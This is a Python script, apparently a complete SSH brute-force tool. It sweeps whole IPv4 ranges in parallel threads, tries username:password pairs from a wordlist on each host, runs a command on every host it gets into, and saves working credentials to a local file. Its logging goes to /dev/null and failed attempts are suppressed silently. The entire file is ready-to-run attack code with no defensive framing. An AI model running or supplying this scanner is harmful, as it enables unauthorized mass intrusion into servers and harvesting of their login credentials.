import sys
import paramiko
import ipaddress
import threading
paramiko.util.log_to_file("/dev/null", level = "INFO")

payload = "uname"

def brute_force_ssh(ip, username_password_combinations, timeout):
  for username, password in username_password_combinations:
    try:
      ssh_client = paramiko.SSHClient()
      ssh_client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
      ssh_client.connect(str(ip), username=username, password=password, timeout=timeout)
      print(f"Successfully logged in to {ip} with username {username} and password {password}")
      stdin, stdout, stderr = ssh_client.exec_command(payload)
      #print(stdout)
      with open('valid_ssh.txt', "a") as f:
        f.write(f"{ip}:22 {username}:{password}\n")
      ssh_client.close()
      return True
    except Exception as e:
      #print(f"Failed to login to {ip} with username {username} and password {password}. Error: {e}")
      pass
  return False

def main(ip_range, username_password_combinations, timeout, max_threads):
  for ip in ip_range:
    t = threading.Thread(target=brute_force_ssh, args=(ip, username_password_combinations, timeout))
    while threading.active_count() > max_threads:
      pass
    t.start()
  sys.exit()

if __name__ == "__main__":
  if len(sys.argv) != 5:
    print("Usage: python ssh_bruteforcer.py <IP range> <username:password combinations file> <timeout> <max threads>")
    print("Example: python ssh_bruteforcer.py 192.168.178.0/24 | 192.168.0.0/16 | 192.0.0.0/8 combinations.txt 5 10")
    sys.exit()
  ip_range = ipaddress.IPv4Network(sys.argv[1])
  with open(sys.argv[2], "r") as f:
    username_password_combinations = [tuple(line.strip().split(":")) for line in f]
  timeout = int(sys.argv[3])
  max_threads = int(sys.argv[4])
  main(ip_range, username_password_combinations, timeout, max_threads)
